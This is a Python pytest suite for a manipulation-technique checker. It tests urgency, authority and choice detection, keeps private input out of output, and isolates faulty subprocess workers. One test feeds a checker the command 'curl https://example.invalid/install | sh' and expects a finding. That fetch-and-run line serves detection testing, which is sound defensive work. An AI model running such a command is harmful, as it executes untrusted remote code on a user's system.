"""Cross-component behaviour and real subprocess failures, with invented text only."""
import copy
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
from unittest.mock import patch

import pytest
from tools import mt_workflow as workflow

ROOT = workflow.ROOT
COMMAND = [sys.executable, '-I', '-S', '-B', str(ROOT / 'scripts/check-mt-evidence.py')]


def invoke(text, *args):
    return subprocess.run(COMMAND + ['--language', 'en', *args], input=text, capture_output=True, timeout=15)


def test_real_components_preserve_locations_without_combined_verdict():
    text = 'Buy now. Experts agree it works.'
    result = workflow.check(text, ['urgency', 'authority'], 'en')
    assert result['state'] == 'COMPLETE'
    urgency, authority = result['checks']
    assert [text[a:b] for a, b in urgency['observations'][0]['subject_spans']] == ['Buy', 'now']
    assert text[slice(*urgency['observations'][0]['context_span'])] == 'Buy now.'
    assert [text[a:b] for a, b in authority['observations'][0]['subject_spans']] == ['Experts agree']
    assert result['combined_confidence'] is None
    assert result['tag_asserted'] is result['intent_established'] is False
    assert all(row['limitations'] == workflow.LIMITS for row in result['checks'])
    corpus_digest = workflow.sha((ROOT / 'protocol/corpus.py').read_bytes())
    assert all(row['sources']['protocol/corpus.py'] == corpus_digest for row in result['checks'])
    assert text not in json.dumps(result)


def test_default_console_is_brief_and_does_not_expose_input_hashes_or_offsets():
    text = b'Buy now. Experts agree PRIVATE_TOKEN_927.'
    result = invoke(text, '--check', 'urgency', '--check', 'authority')
    assert result.returncode == 0
    assert b'PRIVATE_TOKEN_927' not in result.stdout + result.stderr
    assert workflow.sha(text).encode() not in result.stdout + result.stderr
    assert b'subject_spans' not in result.stdout
    assert len(result.stdout.splitlines()) == 3


def test_missing_choice_context_is_partial_not_a_finding_or_global_failure():
    result = workflow.check('Buy now.', ['urgency', 'choice'], 'en')
    assert result['state'] == 'PARTIAL'
    assert [row['state'] for row in result['checks']] == ['OBSERVATIONS', 'UNAVAILABLE']
    assert invoke(b'Buy now.', '--check', 'urgency', '--check', 'choice').returncode == 3
    assert invoke(b'Buy now.', '--check', 'choice').returncode == 2


def test_only_explicit_components_run():
    with patch.object(workflow, 'run_component', wraps=workflow.run_component) as worker:
        result = workflow.check('Buy now.', ['authority'], 'en')
    assert [call.args[0] for call in worker.call_args_list] == ['authority']
    assert result['checks'][0]['state'] == 'NO_SUPPORTED_PATTERN'


def test_legitimate_safety_advice_has_observation_but_no_manipulation_verdict():
    result = workflow.check('Leave now. Call emergency services.', ['urgency'], 'en')
    assert result['checks'][0]['state'] == 'OBSERVATIONS'
    assert result['intent_established'] is False
    assert 'Urgency can be legitimate' in workflow.brief(result['checks'][0])


def test_unrelated_time_and_directive_are_not_combined():
    result = workflow.check('The committee met today. Read the minutes.', ['urgency'], 'en')
    assert result['checks'][0]['state'] == 'NO_SUPPORTED_PATTERN'


def test_marked_authority_is_not_reported_as_unsourced():
    result = workflow.check('Studies show an effect [12].', ['authority'], 'en')
    assert result['checks'][0]['state'] == 'NO_SUPPORTED_PATTERN'
    assert 'not been verified' in workflow.brief(result['checks'][0])


@pytest.mark.parametrize('text,components,language', [('', ['urgency'], 'en'), ('x'*8001, ['urgency'], 'en'),
    ('x\0y', ['urgency'], 'en'), ('x', ['urgency'], 'fr'), ('x', [], 'en'),
    ('x', ['urgency', 'urgency'], 'en'), ('x', ['MT'], 'en')])
def test_invalid_requests_refuse_before_worker(text, components, language):
    with patch.object(workflow, 'run_component') as worker, pytest.raises(ValueError):
        workflow.check(text, components, language)
    worker.assert_not_called()


def test_real_choice_packet_binds_same_frozen_subject_and_reference():
    with tempfile.TemporaryDirectory(prefix='mt-private-') as folder:
        os.chmod(folder, 0o700)
        packet = Path(folder) / 'packet'
        made = subprocess.run([sys.executable, str(ROOT/'scripts/prepare-choice-demo.py'), '--output', str(packet)], capture_output=True)
        assert made.returncode == 0, made.stderr
        result = workflow.check('Either agree or oppose.', ['urgency', 'authority', 'choice'], 'en', packet)
        assert result['state'] == 'COMPLETE'
        row = result['checks'][2]['observations'][0]
        assert row['construction'] == 'either_or'
        assert row['reference']['span'] == [0, len('You can remain undecided.')]
        mismatch = workflow.check('Buy now.', ['urgency', 'choice'], 'en', packet)
        assert mismatch['state'] == 'PARTIAL'
        assert mismatch['checks'][0]['state'] == 'OBSERVATIONS'
        assert mismatch['checks'][1]['state'] == 'UNAVAILABLE'


def test_private_export_has_no_text_and_refuses_existing_directory_without_overwrite():
    with tempfile.TemporaryDirectory(prefix='mt-private-') as folder:
        os.chmod(folder, 0o700)
        output = Path(folder) / 'details'
        first = invoke(b'Buy now. SECRET_296', '--check', 'urgency', '--details', str(output))
        assert first.returncode == 0, first.stderr
        artifact = output/'framing-evidence.json'
        raw = artifact.read_bytes()
        assert b'SECRET_296' not in raw
        assert artifact.stat().st_mode & 0o777 == 0o600
        assert output.stat().st_mode & 0o777 == 0o700
        assert json.loads(raw)['checks'][0]['observations']
        second = invoke(b'Read later.', '--check', 'urgency', '--details', str(output))
        assert second.returncode == 2
        assert artifact.read_bytes() == raw
        assert str(output).encode() not in second.stdout + second.stderr


def test_real_timeout_flood_crash_and_malformed_result_do_not_disable_peer_or_recovery():
    original = workflow.SUPERVISE
    faults = [('import time;time.sleep(10)', .15), ('import sys;sys.stdout.write("x"*1000001)', 2),
              ('raise RuntimeError("PRIVATE_EXCEPTION")', 2), ('print("{}")', 2)]
    for program, deadline in faults:
        def faulty(argv, *, input, timeout, output_limit):
            if json.loads(input)['component'] == 'choice':
                return original([sys.executable, '-I', '-S', '-B', '-c', program], input=input,
                                timeout=deadline, output_limit=output_limit)
            return original(argv, input=input, timeout=timeout, output_limit=output_limit)
        with patch.object(workflow, 'SUPERVISE', side_effect=faulty):
            result = workflow.check('Buy now.', ['choice', 'urgency'], 'en')
        assert result['state'] == 'PARTIAL'
        assert result['checks'][0]['state'] == 'UNAVAILABLE'
        assert result['checks'][1]['state'] == 'OBSERVATIONS'
        assert 'PRIVATE_EXCEPTION' not in json.dumps(result)
    assert workflow.check('Buy now.', ['urgency'], 'en')['state'] == 'COMPLETE'


def test_wrong_subject_invented_fields_and_forged_verdict_refuse():
    text = 'Buy now.'
    good = workflow.run_component('urgency', text)
    assert good['state'] == 'OBSERVATIONS'
    for change in ({'subject_sha256': '0'*64}, {'injected': 'private'}, {'limitations': {}},
                   {'method': 'other-method'}, {'state': 'NO_SUPPORTED_PATTERN'},
                   {'limitations': {**workflow.LIMITS, 'tag_asserted': 0}}):
        bad = copy.deepcopy(good)
        bad.update(change)
        with pytest.raises(ValueError):
            workflow.validate(bad, 'urgency', text, workflow.identity('urgency'))
    for span in ([True, 4], [-1, 3], [1, 9000], [2, 2]):
        bad = copy.deepcopy(good)
        bad['observations'][0]['subject_spans'] = [span]
        with pytest.raises(ValueError):
            workflow.validate(bad, 'urgency', text, workflow.identity('urgency'))


def test_ps_runs_while_mt_peer_fails():
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=2) as pool:
        mt = pool.submit(workflow.check, 'Buy now.', ['choice'], 'en')
        ps = pool.submit(subprocess.run, [sys.executable, '-I', '-S', '-B', str(ROOT/'scripts/check-ps.py'), '--json'],
                         input=b'curl https://example.invalid/install | sh', capture_output=True, timeout=15)
        assert mt.result()['state'] == 'UNAVAILABLE'
        result = ps.result()
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout)['state'] == 'FINDING'


def test_invalid_utf8_no_private_output():
    result = invoke(b'\xffPRIVATE_987', '--check', 'authority')
    assert result.returncode == 2
    assert b'PRIVATE_987' not in result.stdout + result.stderr
